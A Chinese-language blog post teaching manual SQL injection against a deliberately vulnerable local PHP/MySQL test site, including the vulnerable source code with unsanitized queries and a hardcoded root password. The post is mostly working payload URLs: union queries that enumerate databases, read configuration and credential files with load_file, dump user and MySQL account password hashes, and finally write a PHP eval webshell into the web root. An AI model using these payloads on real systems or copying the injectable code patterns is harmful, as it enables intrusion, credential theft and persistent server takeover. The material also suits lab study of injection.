---
layout: post
title: SQL注入起步
category: project
description: 简单的 SQL 手工注入得到一些信息。
---

## 准备

平台: Windows + Apache + PHP + MySQL

![20160904221051.png](/images/20160904221051.png)

![20160904221114.png](/images/20160904221114.png)

index.php

```
<!DOCTYPE html>
<html lang="zh_CN">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Test PHP Sql Injection</title>
	<link rel="stylesheet" href="">
</head>
<body>
	<h2>Article List</h2>
	<?php 
	if(isset($_POST['title']) && isset($_POST['content'])){
		$con = new mysqli("localhost","root","123456","test");
		date_default_timezone_set('prc');
	 	$title = $_POST['title'];
	 	$content = $_POST['content'];
		if($res = $con->query("INSERT INTO article(title,content) VALUES('$title','$content')")){
			header("Location:./");
		}
	}else{
		$con = new mysqli("localhost","root","123456","test");
		date_default_timezone_set('prc');
		echo "<ul>";
		if($res = $con->query("SELECT * FROM article")){
			while($row=$res->fetch_object()){
				$id = $row->id;
				$title = $row->title;
				echo "<li><a href='./article.php?id=$id'>$title</a></li>";
			}
			$res->close();
		}		
		echo "</ul>";
	}
	 ?>
	<br>
	<br>
	 <form method="post">
	 	<label for="title">Title</label>
	<br>
	 	<input type="text" name="title" >
	<br>
	 	<label for="content">Content</label>
	<br>
	 	<textarea name="content" id="content" cols="80" rows="30"></textarea>
	<br>
	 	<input type="submit" value="Submit">
	 </form>

</body>
</html>

```

article.php

```
<!DOCTYPE html>
<html lang="zh_CN">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Test PHP Sql Injection</title>
	<link rel="stylesheet" href="">
</head>
<body>
	<?php
		if(isset($_GET['id'])){
			$con = new mysqli("localhost","root","123456","test");
			date_default_timezone_set('prc');
			$id = $_GET['id'];
			if($res = $con->query("SELECT * FROM article WHERE id=$id")){
				while($row=$res->fetch_object()){
					$title = $row->title;
					$content = $row->content;
					echo "<h2>$title</h2>";
					echo "<br>";
					echo "<p>$content</p>";
				}
				$res->close();
			}		
		} 
	 ?>
</body>
</html>

```

## 开始

> 注释可以是 `#` 也可以是 ` -- ` 或者 `\*` 或者是 `+` ，在某些时候，`+` 的效果比较好

发现 `http://127.0.0.1/test/article.php?id=1` 链接，经测试，当 链接为 `http://127.0.0.1/test/article.php?id=1 and 1=1 -- ` 时返回正常页面，当链接为 `http://127.0.0.1/test/article.php?id=1 and 1=-1 -- ` 时不能返回正常页面。

由此得知 php 对 GET 请求的参数未经过滤，此处存在 Sql 注入。

### 判断数据列数

使用 order by 手工测试数据列数，当链接为 `127.0.0.1/test/article.php?id=1 order by 3 -- ` 时返回正常页面， `127.0.0.1/test/article.php?id=1 order by 4 -- ` 时无法返回正常页面，由此得知数据应有 3 列。

![20160904200455.png](/images/20160904200455.png)

![20160904200751.png](/images/20160904200751.png)

### 得到数据库基本信息

```
system_user() 系统用户名
user() 用户名
current_user 当前用户名
session_user()连接数据库的用户名
database() 数据库名
version() MYSQL数据库版本
load_file() MYSQL读取本地文件的函数
@@datadir 读取数据库路径
@@basedir MYSQL 安装路径
@@version_compile_os 操作系统
```

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,user() --`   得到用户名 root@localhost

`http://127.0.0.1/test/article.php?id=-1 union select 1,version(),database() --` 得到版本号 5.7.9 和 数据库名 test

`http://127.0.0.1/test/article.php?id=-1 union select 1,@@datadir,@@version_compile_os --`  得到数据库文件路径 D:\Program Files (x86)\MySQL\MySQL Server 5.7\data\ 和操作系统版本 Win32

```

windows:

C:\php\php.ini 	PHP配置文件
D:\Program Files (x86)\MySQL\MySQL Server 5.7\my.ini MySQL配置文件
D:\Program Files (x86)\MySQL\MySQL Server 5.7\data\mysql\user.MYD 	MySQL用户名和密码文件
C:\apache24\conf\httpd.conf Apache配置文件

Ubuntu :
/etc/apache2/apache2.conf    apache2 配置文件
/etc/php5/apache2/php.ini     php 配置文件
/etc/mysql/my.cnf                      mysql 配置文件
/etc/issue
/etc/issue.net                        版本号
/etc/passwd                         用户账号和密码
/proc/cpuinfo                       cpu 信息
/proc/meminfo                      内存信息

/etc/sysconfig/iptables 从中得到防火墙规则策略
/etc/httpd/conf/httpd.conf  apache配置文件
/etc/redhat-release 系统版本
/usr/local/app/php5/lib/php.ini PHP相关设置
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件
/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
```

判断网站运行在 Windows 下，使用 load_file 读取配置文件，Windows 下不区分大小写

`http://127.0.0.1/test/article.php?id=-1 union select 1,load_file("C:\\php\\php.ini"),load_file("C:\\apache24\\conf\\httpd.conf") --`

### 查询数据库表名，字段和内容

如果直接使用名字去查，查不出来的话，可以使用 char 或者 十六进制形式

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,concat(table_name) from information_schema.tables where table_schema=database() --` 得到两个表名 article 和 user

在查表时发现，如果直接查询的话并不能查询出来，需要将表名转码为 CHAR(97, 114, 116, 105, 99, 108, 101) 字符之后就可以查询出来
`http://127.0.0.1/test/article.php?id=-1 union select 1,2,concat(column_name) from information_schema.columns where table_name=article  --`  查询不出来

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,concat(column_name) from information_schema.columns where table_name=CHAR(97, 114, 116, 105, 99, 108, 101) and table_schema=test --`  查询出三个字段 id title content

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,concat(column_name) from information_schema.columns where table_name=CHAR(117, 115, 101, 114) and table_schema=test --`  查询出三个字段 id username password

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=CHAR(117, 115, 101, 114) and table_schema=database() --`

> 使用 group_concat 与 concat 的区别是，concat 能将不同的字段查找的值连接起来，group_concat 能将所有的每个字段查找到的值一次全部连接起来

然后查询内容

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,concat(id,title,content) from article --`  可以查出全部的文章。

`http://127.0.0.1/test/article.php?id=-1 union select 1,username,password from user --`  可以查出 user 表的内容

> 其中密码是加密过的，可以找在线 md5 解密网站解密出来

### 查询其他数据库和内容

`http://127.0.0.1/test/article.php?id=-1 union select 1,schema_name,3 from information_schema.schemata --`  可以查看所有的数据库

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,concat(table_name) from information_schema.tables where table_schema=数据库名 --` 即可得到表名名

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,concat(column_name) from information_schema.columns where table_name=表的 char 形式 -- `  即可得到字段

### 查询 MySQL 用户和密码

`http://127.0.0.1/test/article.php?id=1 and (select count(*) from mysql.user)>0 --`  查询有无 MySQL 用户

`http://127.0.0.1/test/article.php?id=1 and (select count(file_priv) from mysql.user)>0 --` 查询有无 MySQL 用户有文件读写权限

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,concat(user,file_priv) from mysql.user --` 查询是哪些 MySQL 用户具有读写权限

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,concat(user,authentication_string) from mysql.user --` 可以查出 MySQL  用户的密码，在 linux 下authentication_string 为 password

> 其中密码是加密过的，可以找在线 md5 解密网站解密出来

### 写入 webshell

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,"test" into outfile "D:\\test.txt" --`  测试能否写入文件

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,load_file("D:\\test.txt") --`  测试文件是否写入

`http://127.0.0.1/test/article.php?id=-1 union select 1,2,"<?php @eval($_POST['pass'])?>" into outfile "C:\\apache24\\htdocs\\test\\caidao.php" --`  写入 webshell ，成功连入菜刀

![20160904221012.png](/images/20160904221012.png)
